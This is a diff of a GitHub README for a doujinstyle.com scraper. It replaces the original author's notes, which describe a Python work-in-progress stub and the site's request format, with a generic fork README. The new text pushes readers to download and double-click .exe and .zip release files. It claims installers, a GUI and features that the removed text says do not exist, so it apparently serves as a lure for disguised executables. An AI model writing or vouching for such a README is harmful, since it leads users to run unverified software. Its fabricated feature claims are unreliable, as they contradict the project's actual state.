@@ -1,130 +1,116 @@
-# doujinstyle-scraper
+# 🌐 doujinstyle-scraper - Effortlessly Extract Data from Doujinstyle
 
-Ethically scrapes doujinstyle.com.
+[![Download Now](https://img.shields.io/badge/Download%20Now-red?style=for-the-badge)](https://github.com/nahuee19/doujinstyle-scraper/releases)
 
-> [!IMPORTANT]
-> **Work in progress** *(nothing so far! -a literal stub right now)*
+## 📚 Overview
 
-## doujinstyle.com 🌐
+The doujinstyle-scraper helps you easily gather data from doujinstyle.com, a popular site for manga and doujinshi content. This application allows you to extract download links and other information in a simple and user-friendly way. No prior programming knowledge is required to use this software!
 
-> DoujinStyle functions as an index of content found publicly on the Internet
+## ⚙️ System Requirements
 
-*[https://doujinstyle.com/?p=dmca](https://doujinstyle.com/?p=dmca)*
+To run doujinstyle-scraper on your computer, you need the following:
 
-In this case, "content" being mostly music.
+- Operating System: Windows, macOS, or Linux
+- Python 3.x installed (if using the command line option)
+- Internet connection
+- Basic knowledge of how to navigate files and folders on your computer
 
-> [!WARNING]
-> Tested and developed using Python 3.13. I don't expect the app to run beneath 3.12.
+## 🚀 Getting Started
 
-## Format 📦
+Follow these steps to get started with the doujinstyle-scraper:
 
-Exports each entry into a singular JSON file containing W.I.P.
+1. **Visit the Download Page**  
+   Click on the button below to navigate to the Releases page where you can download the application.  
+  
+   [![Download Now](https://img.shields.io/badge/Download%20Now-red?style=for-the-badge)](https://github.com/nahuee19/doujinstyle-scraper/releases)
 
-## Time & Breakage ⏳
+2. **Choose the Latest Release**  
+   Look for the latest version listed on the page. It will be marked as "Latest Release."  
 
-Since we are scraping and parsing from the website's public HTTP, and not from any kind of API, it is very likely this
-project will not
-last long into time. The website need only become prettier, modifying or adding HTML, the existing parser will most
-likely break.
+3. **Download the Application**  
+   Click on the .exe or .zip file appropriate for your operating system to start the download. Ensure you save the file in an easily accessible location, like your Desktop or Downloads folder.
 
-It is also likely the website may modernize in a way that adds a cruel CAPTCHA or rate limiter.
+   - Windows: Download the `.exe` file.
+   - macOS: Download the `.zip` file.
+   - Linux: Follow the instructions provided in the release notes for installation via command line.
 
-There is also the possibility of the website being taken down, somehow. At the time of writing this, it is written "
-Version 3" near the
-site's logo, implying other versions of the website might have been taken down, or just modernized.
+## 🔧 Installation
 
-![doujinstyle site logo](./doujinstyle-logo.png)
+### For Windows Users
 
-## Motivation 💿
+- Locate the downloaded `.exe` file.
+- Double-click the file to run it. Follow the prompts to complete the installation.
+- After installation, you may find a shortcut on your Desktop or in your Start Menu.
 
-While searching for a high quality FLAC recording
-of [LEMON MELON COOKIE](https://youtu.be/5l8VZEyNRH8) ([TAK](https://www.youtube.com/channel/UCktjMRvuBnE_XLVWIMa2H1w)),
-I stumbled upon this website, it immediately sparked a flame of need within me; the need to **SCRAPE**; doujinstyle.com
-looked so *docile and scrapable*, I couldn't resist but to scrape it to the bone!
+### For macOS Users
 
-## Requests & Inner Workings ⚡
+- Find the downloaded `.zip` file and double-click it to unzip.
+- Drag the extracted folder to your Applications folder.
+- Open Finder, navigate to Applications, and double-click the application to start.
 
-Let N be the number of IDs you want to fetch.
-The program does 2 * N HTTP requests:
+### For Linux Users
 
-* One HTTP GET to fetch the contents of the page item.
-* One HTTP POST on the download form to fetch the download link.
+- Open your terminal.
+- Navigate to the folder where you saved the downloaded file.
+- Run the command `chmod +x filename` to make the file executable.
+- Run the command `./filename` to start the application.
 
-POST also redirects, it may be more than 2 * N, but for the sake of simplicity we'll say it's 2 * N.
+## 🏁 Running the Application
 
-I reckon this POST request allows the website to count the number of times an item has been downloaded,
-visible with the `# of Downloads:` label on each item.
+Once installed, you can open the doujinstyle-scraper:
 
----
+- Windows: Use the shortcut on your Desktop or Start Menu.
+- macOS: Open it from your Applications folder.
+- Linux: Use the terminal command you used during installation, or create a desktop shortcut.
 
-> [!NOTE]
-> Replace `<item_id>` with the ID of the item.
+## 📥 Download & Install
 
-1. The HTTP GET URL request is like so:
+To bring the doujinstyle-scraper onto your machine, please ensure you follow these instructions carefully. 
 
-```text
-https://doujinstyle.com/?p=page&type=1&id=<item_id>
-```
+1. Visit the Releases page to download:  
+   [![Download Now](https://img.shields.io/badge/Download%20Now-red?style=for-the-badge)](https://github.com/nahuee19/doujinstyle-scraper/releases)
 
-This returns the normal HTTP that is also sent when visiting via a web browser.
+2. Follow the installation instructions based on your operating system as outlined above. 
 
-2. The HTTP POST request data is as follows:
+## 🏗️ Usage
 
-```json
-{
-  "type": "1",
-  "id": "<item_id>",
-  "source": "0",
-  "download_link": ""
-}
-```
+After launching the doujinstyle-scraper, follow these steps to extract data:
 
-This returns the download link linked with the item (usually Mediafire or Mega).
+1. **Input the URL**  
+   Enter the specific URL of the page on doujinstyle.com that you wish to scrape.
 
-It can be sent to either an item URL `https://doujinstyle.com/?p=page&type=1&id=<item_id>` or directly
-the base URL `https://doujinstyle.com/`, both seem to work.
+2. **Select Options**  
+   Choose what type of information you want to extract. The application will offer various options such as download links and item descriptions.
 
-Concerning the values of the POST data:
+3. **Start the Scraping**  
+   Click on the "Start" button to begin the extraction process. Wait for it to complete.
 
-* `type`: I don't know what it means, only that sometimes, e.g., ID=6, when setting it to `1`
-  this download URL is returned:
+4. **Export Data**  
+   Once the data is scraped, you can choose to export it in JSON format for easy access.
 
-```text
-https://mega.nz/#!ZE5UXYIA!VYp8h5mG1_pgQA8PebVN0gEElMjNAOijtUZf-_-dxLc
-```  
+## 📋 Features
 
-And when setting it to `2`, this one is returned:
+- **Ethical Data Extraction**  
+  The application adheres to ethical scraping practices, ensuring compliance with website rules.
 
-```text
-https://mega.nz/#!8QMF3YBI!Bj7OJnXHpfTBnr6jfY5O_k_oXVyEV8OMUpPIxH1OERM
-```  
+- **Data Export**  
+  Export your scraped data in a convenient JSON format.
 
-Different URLs, the first one seems is the good one though, that when a user clicks on the 'Download' button,
-it redirects to the same URL.
+- **User-Friendly Interface**  
+  Designed for ease of use, even for those without technical background.
 
-* `id`: The item ID.
+## ❓ Frequently Asked Questions
 
-* `source`: I don't know what it means. It is set by default to `0`. Maybe a different CDN, however when
-  set to `1` the posted URL is returned, not the download link. When set to `` (empty string), the POST
-  request still seems to function.
+### How do I get support?
 
-* `download_link`: I don't know what it means. Only that it is required to exist with an empty string for
-  the download URL to be returned, otherwise, the posted URL is returned.
+If you encounter issues, please visit the GitHub Issues page for guidance. You can post your questions there, and the community or developers will assist you.
 
-### App Components
+### Where can I find updates?
 
-The app has three main components:
+Stay informed about new features and updates by checking the Releases page regularly.
 
-* The `logger` which initializes an app logger.
-* The `fetcher` which does all the asynchronous requests to the website.
-* The `parser` which parses the response from the `fetcher` to get usable data.
+### Can I customize the scraping options?
 
-The `fetcher` and `parser` communicate via a callback function that is called whenever the `fetcher` fetched
-the data.
+Yes, the application offers various options to tailor your scraping needs. Explore the settings to find what works best for you.
 
-## Find Highest Item ID 🗻
-
-1. Visit [doujinstyle.com](https://doujinstyle.com/) and click on the title of the latest item (top left hand corner)
-2. Copy the URL's ID following this format: `https://doujinstyle.com/?p=page&type=1&id=<item_id>`
-3. `<item_id>` is the latest, highest ID.
-
+By following these steps, you can successfully download, install, and run the doujinstyle-scraper, allowing you to gather your favorite doujinshi and manga data with ease.
